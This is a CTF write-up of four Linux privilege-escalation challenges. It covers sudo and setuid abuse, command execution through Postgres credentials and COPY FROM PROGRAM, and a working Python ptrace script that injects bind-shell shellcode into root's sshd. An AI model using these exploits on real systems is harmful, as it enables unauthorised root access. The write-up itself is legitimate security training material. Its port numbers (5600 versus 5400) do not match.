---
title: "5Charlie CTF - Escalator"
date: 2020-06-26 17:00:00 -0500
categories:
  - write-up
tags:
  - ctf
  - write-up
  - linux
  - hacking
  - privesc
---

A write-up of the "Escalator" privelege escalation challenge set from 5Charlie CTF.

## Escalator 1

### Escalator 1 - Challenge

To access these challenges, ssh to chosen@analysis.5charlie.com using the attached private key.

What is reah's flag?

**Attachments:** `id_chosen` - SSH Key

### Escalator 1 - Solution

As an entry point to the challenge, we're probably looking for some low-hanging fruit.
We can check what privileges users are given by the `sudo` utility by using the command:

{% highlight bash %}
sudo -l
{% endhighlight %}

``` text
User chosen may run the following commands on e9b5bb17d8a0:
    (reah) NOPASSWD: /bin/egrep
```

Examining the output, we can determine that we're allowed to run the `egrep` command as the user `reah` without specifying a pasword (`NOPASSWD`).
When running the command, make sure you use the absolute path.

{% highlight bash %}
chosen@e9b5bb17d8a0:/$ sudo -u reah /bin/egrep '*' /home/reah/flag.txt
{% endhighlight %}

**Flag:** `flag{curiosity_kindled}`

## Escalator 2

### Escalator 2 - Challenge

What is solaire's flag?

### Escalator 2 - Solution

This user also has a low number of points assigned. We're likely looking for something common.
Let's search for suid binaries, or binaries that run with another user's permissions.

{% highlight bash %}
find / -perm /4000 -type f 2>/dev/null
{% endhighlight %}

``` text
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/local/bin/sunbro
/bin/umount
/bin/mount
/bin/su
```

Most of these are fairly common and not risky, but `/usr/local/bin/sunbro` stands out both because it's not one of the usual results and also because "sun" and "sol" are closely related language.

``` text
chosen@e9b5bb17d8a0:/home/solaire$ ls -la /usr/local/bin/sunbro
-rwsr-xr-x 1 solaire root 122224 May 13 03:51 /usr/local/bin/sunbro
chosen@e9b5bb17d8a0:/home/solaire$ file /usr/local/bin/sunbro
/usr/local/bin/sunbro: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=33c5bdbbb64a68a74188dcedb0a200fa78b6557d, stripped
chosen@e9b5bb17d8a0:/home/solaire$ /usr/local/bin/sunbro
Usage: /usr/local/bin/sunbro [OPTION]... {script-only-if-no-other-script} [input-file]...

  -n, --quiet, --silent
                 suppress automatic printing of pattern space
      --debug
                 annotate program execution
  -e script, --expression=script
                 add the script to the commands to be executed
  -f script-file, --file=script-file
                 add the contents of script-file to the commands to be executed
  --follow-symlinks
                 follow symlinks when processing in place
  -i[SUFFIX], --in-place[=SUFFIX]
                 edit files in place (makes backup if SUFFIX supplied)
  -l N, --line-length=N
                 specify the desired line-wrap length for the `l' command
  --posix
                 disable all GNU extensions.
  -E, -r, --regexp-extended
                 use extended regular expressions in the script
                 (for portability use POSIX -E).
  -s, --separate
                 consider files as separate rather than as a single,
                 continuous long stream.
      --sandbox
                 operate in sandbox mode (disable e/r/w commands).
  -u, --unbuffered
                 load minimal amounts of data from the input files and flush
                 the output buffers more often
  -z, --null-data
                 separate lines by NUL characters
      --help     display this help and exit
      --version  output version information and exit
If no -e, --expression, -f, or --file option is given, then the first
non-option argument is taken as the sed script to interpret.  All
remaining arguments are names of input files; if no input files are
specified, then the standard input is read.

GNU sed home page: <https://www.gnu.org/software/sed/>.
General help using GNU software: <https://www.gnu.org/gethelp/>.
```

Examining the file, we can determine that this is just GNU utility `sed`, but renamed.

{% highlight bash %}
chosen@400f7a9ed956:/home/solaire$ /usr/local/bin/sunbro '' flag.txt
{% endhighlight %}

**Flag:** `flag{praise_the_sun}`

## Escalator 3

### Escalator 3 - Challenge

What is dusk's flag?

### Escalator 3 - Solution

The point values are increasing.
This will probably be a little tougher.
I probably should have taken a look at dusk's home directory first, but after skimming some other areas that's where I eventually ended up.

``` text
chosen@b78b6d382aea:/home/dusk$ ls -la
total 28
drwxr-xr-x 1 dusk dusk 4096 May 13 03:51 .
drwxr-xr-x 1 root root 4096 May 13 03:51 ..
-rw-r--r-- 1 dusk dusk  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 dusk dusk 3526 Apr 18  2019 .bashrc
-rwx------ 1 dusk dusk   20 May 13 03:51 flag.txt
-rw-r--r-- 1 dusk dusk   20 May 13 03:51 .pgpass
-rw-r--r-- 1 dusk dusk  807 Apr 18  2019 .profile
```

Interesting. We have a Postgresql credential file stored in the directory.
My best guess at this point is that we're going to use that to authenticate to Postgres as dusk and use Postgres to read the flag file.
Let's give it a go.

``` text
chosen@b78b6d382aea: /home/dusk^Gchosen@b78b6d382aea:/home/dusk$ cat .pgpass 
*:*:*:dusk:oolacile
```

We don't know what databases exist (may be able to find them elsewhere on the system, but I didn't check), so we'll use one that's likely to exist by default: `template1`.

``` text
chosen@b78b6d382aea:/home/dusk$ psql -U dusk template1
Password for user dusk:
psql (12.2 (Debian 12.2-2.pgdg100+1))
Type "help" for help.
template1=#
```

Let's try reading the flag file.

``` text
template1=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
template1=# COPY cmd_exec FROM PROGRAM 'cat /home/dusk/flag.txt'; SELECT * FROM cmd_exec;
cmd_output
flag{crystal_clear}
```

**Flag:** `flag{crystal_clear}`

## Escalator 4

### Escalator 4 - Challenge

What is root's flag?

### Escalator 4 - Solution

This one has quite a point difference compared to the other flags. Endgame.
We burn through all the common low-hanging fruit, check through a lot of misconfigurations, and finally come across something interesting by checking binary capabilities.

{% highlight bash %}
chosen@b78b6d382aea:/$ getcap -r / 2>/dev/null
{% endhighlight %}

``` text
/usr/bin/python3.7 = cap_sys_ptrace+ep
```

If you're unfamiliar with newer Linux systems, there are "capabilities" that allow a binary to run privileged operations.
In this instace `python3.7` has the ability to use `ptrace` capabilities.
`cap_sys_ptrace` is permission to debug.
Given this capability, we can pause, modify, and restart any process running on the system.
We'll use this to pause a process running as root, inject shellcode, and run it with those permissions.
The only process running as root is `sshd`, but luckily it spawns each ssh session in a new thread, so we don't have to worry about our connection.

I wasn't incredibly familiar with how to do this in Python, so I spent a good amount of time digging through some resources before a member of my team pointed me to a similar challenge from PentesterAcademy: <https://attackdefense.com/challengedetailsnoauth?cid=1412>
The code was for the wrong Python version and a bit more than I was looking for, but I was eventually able to make some conversions and boil it down to what I was looking for into the following.

{% highlight python %}
import codecs
import ctypes
import sys
import struct
import subprocess

# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]


pid = int(subprocess.check_output(["pidof", "sshd"]).decode().strip())
libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc-2.28.so")

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)

# Retrieve the value stored in registers
registers=user_regs_struct()
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: {:016X}".format(registers.rip))
print("Injecting Shellcode at: {:016X}".format(registers.rip))

# Shell code copied from exploit db: BIND: localhost-TCP/5600
shellcode=b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in range(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(codecs.encode(shellcode[i:4+i], 'hex'),16)
    print("BYTE: {}".format(shellcode_byte_int))
    shellcode_byte_little_endian=codecs.encode(
        struct.pack("<I", shellcode_byte_int)
        .rstrip(b'\x00')
        , 'hex'
    )
    shellcode_byte=int(shellcode_byte_little_endian,16)
    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)


# Modify the instruction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))

print(f"Final Instruction Pointer: {hex(registers.rip)}")

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
{% endhighlight %}

After running it by opening a `python3.7` interpreter and pasting it in, we were able to connect to the new bind shell.

{% highlight bash %}
chosen@b78b6d382aea:/$ nc localhost 5400

cat /root/flag.txt
flag{oh_the_humanity}
{% endhighlight %}

**Flag:** `flag{oh_the_humanity}`
